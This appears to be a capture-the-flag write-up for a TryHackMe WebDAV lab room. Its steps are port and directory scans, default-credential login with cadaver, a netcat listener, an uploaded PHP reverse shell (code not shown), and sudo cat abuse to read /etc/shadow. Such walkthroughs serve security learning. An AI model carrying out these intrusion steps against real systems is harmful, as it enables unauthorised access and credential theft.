# Room
https://tryhackme.com/room/bsidesgtdav

# Task 1
* Enumeration - nmap
    ```
    nmap -A -T4 10.10.14.209

    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-30 18:36 EST
    Nmap scan report for 10.10.14.209
    Host is up (0.14s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 17.61 seconds    
    ```
* Enumeration - rustscan
    ```
    rustscan -a 10.10.148.229
    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
    The Modern Day Port Scanner.
    ________________________________________
    : https://discord.gg/GFrQsGy           :
    : https://github.com/RustScan/RustScan :
    --------------------------------------
    Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

    [~] The config file is expected to be at "/home/user/.rustscan.toml"
    [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
    [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
    Open 10.10.148.229:80
    [~] Starting Script(s)
    [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

    [~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-21 14:38 EDT
    Initiating Ping Scan at 14:38
    Scanning 10.10.148.229 [2 ports]
    Completed Ping Scan at 14:38, 0.22s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 14:38
    Completed Parallel DNS resolution of 1 host. at 14:38, 0.00s elapsed
    DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
    Initiating Connect Scan at 14:38
    Scanning 10.10.148.229 [1 port]
    Discovered open port 80/tcp on 10.10.148.229
    Completed Connect Scan at 14:38, 0.22s elapsed (1 total ports)
    Nmap scan report for 10.10.148.229
    Host is up, received syn-ack (0.22s latency).
    Scanned at 2021-03-21 14:38:31 EDT for 1s

    PORT   STATE SERVICE REASON
    80/tcp open  http    syn-ack

    Read data files from: /home/linuxbrew/.linuxbrew/Cellar/nmap/7.91/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds

    ```
* Enumeration - gobuster
    ```
    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.14.209 -t 50 -x t
    xt,html,php 
    ===============================================================                                                                                     
    Gobuster v3.0.1                                                                                                                                     
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                                                     
    ===============================================================                                                                                     
    [+] Url:            http://10.10.14.209                                                                                                             
    [+] Threads:        50                                                                                                                              
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     php,txt,html
    [+] Timeout:        10s
    ===============================================================
    2021/01/30 18:37:38 Starting gobuster 
    ===============================================================
    /index.html (Status: 200)
    /webdav (Status: 401)
    Progress: 74716 / 220561 (33.88%)^C
    [!] Keyboard interrupt detected, terminating.
    ===============================================================
    2021/01/30 18:51:15 Finished
    ===============================================================
    ```

* Enumeration - feroxbuster
    ```
    feroxbuster --url http://10.10.78.142 --depth 7 --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt

    ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.2.1
    ───────────────────────────┬──────────────────────
    🎯  Target Url            │ http://10.10.78.142
    🚀  Threads               │ 50
    📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
    👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
    💥  Timeout (secs)        │ 7
    🦡  User-Agent            │ feroxbuster/2.2.1
    💉  Config File           │ /etc/feroxbuster/ferox-config.toml
    🔃  Recursion Depth       │ 7
    🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
    🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    401       14l       54w      459c http://10.10.78.142/webdav
    403       11l       32w      296c http://10.10.78.142/.htpasswd
    403       11l       32w      300c http://10.10.78.142/server-status
    403       11l       32w      296c http://10.10.78.142/.htaccess
    [####################] - 1m     20474/20474   0s      found:4       errors:2      
    [####################] - 1m     20474/20474   223/s   http://10.10.78.142

    ```

* Gaining Access - webdav
    ```
    Tried auth test with curl, see that authentication is required for this share

        curl -v http://10.10.148.229/webdav/hi.txt -X PUT
    *   Trying 10.10.148.229:80...
    * Connected to 10.10.148.229 (10.10.148.229) port 80 (#0)
    > PUT /webdav/hi.txt HTTP/1.1
    > Host: 10.10.148.229
    > User-Agent: curl/7.74.0
    > Accept: */*
    > 
    * Mark bundle as not supporting multiuse
    < HTTP/1.1 401 Unauthorized
    ```
* Research - creds
    ```
    Research web for default webdav creds, found a few and tried them, one worked for wampp

    cadaver http://10.10.148.229/webdav/
    Authentication required for webdav on server `10.10.148.229':
    Username: wampp
    Password: 
    dav:/webdav/> ls
    Listing collection `/webdav/': succeeded.
            passwd.dav                            44  Aug 25  2019
    ```
* Gaining Access - shell
    ```
    Setup listener on attack machine

    nc -nvlp 5544                                                                                                                  
    listening on [any] 5544 ... 

    Upload a PHP reverse shell

    dav:/webdav/> put revshell.php
    Uploading revshell.php to `/webdav/revshell.php':
    Progress: [=============================>] 100.0% of 5490 bytes succeeded.

    Browse to shell using web browser, successful connection

    connect to [a.b.c.d] from (UNKNOWN) [10.10.148.229] 47770                                                                                                        
    Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux                                                            
    12:02:42 up 26 min,  0 users,  load average: 0.00, 0.00, 0.00                                                                                                       
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                                                                  
    uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                                
    /bin/sh: 0: can't access tty; job control turned off                                                                                                                 
    $ whoami                                                                                                                                                             
    www-data                            
    ```
* Privilege Escalation
    ```
    Check sudo

    $ sudo -l
    Matching Defaults entries for www-data on ubuntu:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on ubuntu:
        (ALL) NOPASSWD: /bin/cat
    $ 

    At this point we can cat any file.  We can cat the flag.  We can cat /etc/shadow and brute force with john or hashcat
    ```